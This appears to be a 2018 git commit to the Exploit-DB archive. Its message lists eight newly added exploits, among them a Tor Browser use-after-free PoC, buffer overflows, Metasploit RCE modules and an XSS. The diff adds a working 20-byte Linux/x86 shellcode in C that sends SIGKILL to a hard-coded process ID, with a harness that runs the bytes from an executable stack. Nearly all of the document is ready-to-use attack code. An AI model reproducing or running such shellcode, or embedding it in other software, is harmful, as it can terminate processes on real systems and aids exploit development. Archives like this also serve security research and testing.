727943f7752c0adcec0b4e77b5e42f6a5ce343f0
Offensive Security <info@exploit-db.com>
2018-07-10 05:01:55 +0000

    DB: 2018-07-10
    8 changes to exploits/shellcodes
    
    Tor Browser < 0.3.2.10 - Use After Free (PoC)
    
    Boxoft WAV to WMA Converter 1.0 - Local Buffer Overflow (SEH)
    Activision Infinity Ward Call of Duty Modern Warfare 2 - Buffer Overflow
    HP VAN SDN Controller - Root Command Injection (Metasploit)
    HID discoveryd - command_blink_on Unauthenticated RCE (Metasploit)
    GitList 0.6.0 - Argument Injection (Metasploit)
    
    Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting
    
    Linux/x86 - Kill Process Shellcode (20 bytes)

---
+++ shellcodes/linux_x86/44990.c
@@ -0,0 +1,33 @@
+/*
+     Exploit Title: Kill PID shellcode
+     Date: 07/09/2018
+     Exploit Author: Nathu Nandwani
+     Platform: Linux/x86
+     Size: 20 bytes
+     Compile: gcc -fno-stack-protector -z execstack killproc.c -o killproc
+*/
+#include <string.h>
+#include <stdio.h>
+int main() 
+{
+	unsigned short pid = 2801;
+	
+	char shellcode[] = 
+	"\x31\xc0" /* xor eax, eax */
+	"\xb0\x25" /* mov al, 0x25 - SYS_KILL */
+	"\x89\xc3" /* mov ebx, eax */
+	"\x89\xc1" /* mov ecx, eax */
+	"\x66\xbb" /* mov bx, ? */
+	"\xF1\x0A" /* bx <= pid => 2801 = 0x0AF1 */
+	"\xb1\x09" /* mov cl, 0x09 - SIGKILL */
+	"\xcd\x80" /* int 0x80 */
+	"\xb0\x01" /* mov al, 0x01 */
+	"\xcd\x80"; /* int 0x80 */
+
+	shellcode[10] = pid & 0xff;
+	shellcode[11] = (pid >> 8) & 0xff;
+
+	printf("Shellcode length: %d\n", strlen(shellcode));
+	int (*ret)() = (int(*)())shellcode;
+	ret();
+}
